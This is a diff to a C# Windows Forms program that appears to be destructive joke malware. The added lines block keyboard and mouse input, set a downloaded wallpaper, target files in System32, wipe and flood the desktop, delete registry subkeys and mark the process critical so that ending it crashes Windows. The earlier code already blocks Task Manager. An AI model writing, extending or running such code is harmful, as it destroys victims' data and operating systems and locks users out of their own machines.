@@ -12,6 +12,8 @@ using System.Net;
 using Microsoft.Win32;
 using System.IO;
 using System.Threading;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
 
 namespace bramerto_rob_2._0
 {
@@ -26,6 +28,9 @@ namespace bramerto_rob_2._0
         Random r = new Random();
 
         Settings s = new Settings();
+
+        [DllImport("ntdll.dll", SetLastError = true)]
+        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
 
         public partial class NativeMethods
         {
@@ -47,7 +52,8 @@ namespace bramerto_rob_2._0
         private void Form1_Load(object sender, EventArgs e)
         {
             s.BlockTM();
-            sp.Play(); 
+            sp.Play();
+            NativeMethods.BlockInput(true);
             timer1.Enabled = true;
             timer1.Start();
         }
@@ -56,28 +62,27 @@ namespace bramerto_rob_2._0
         {
             timer1.Enabled = false;
             timer1.Stop();
-            this.WindowState = FormWindowState.Minimized;
-            sp2.PlayLooping();
             string desktop = @"C:\Users\" + Environment.UserName + @"\Desktop\LOL.jpg";
             wc.DownloadFile("https://s0.rbk.ru/v6_top_pics/resized/590xH/media/img/3/87/756107202790873.jpg", desktop);
             s.SetWallpaper(desktop);
             s.SetVolume(100);
             s.KillMemory(@"C:\Windows\System32\", 1000);
             s.DeleteALLFromDesktop();
-            s.CreateFilesOnDesktop(1000, "https://rozetked.me/images/uploads/fJ8LPcfByPPv.jpg", "Shrek.ru");                
+            s.CreateFilesOnDesktop(1000, "https://rozetked.me/images/uploads/fJ8LPcfByPPv.jpg", "Shrek.ru");
+            this.WindowState = FormWindowState.Minimized;
+            sp2.PlayLooping();
+            timer2.Enabled = true;
+            timer2.Start();
+            s.OpenPage();
         }
 
-        public static void BlockInput(TimeSpan span)
+        private void Timer2_Tick(object sender, EventArgs e)
         {
-            try
-            {
-                NativeMethods.BlockInput(true);
-                Thread.Sleep(span);
-            }
-            finally
-            {
-                NativeMethods.BlockInput(false);
-            }
+            s.DeleteSubKey(@"SYSTEM", @"System", @"Software");
+            int isCritical = 1;  
+            int BreakOnTermination = 0x1D;
+            Process.EnterDebugMode();
+            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
         }
     }
 }
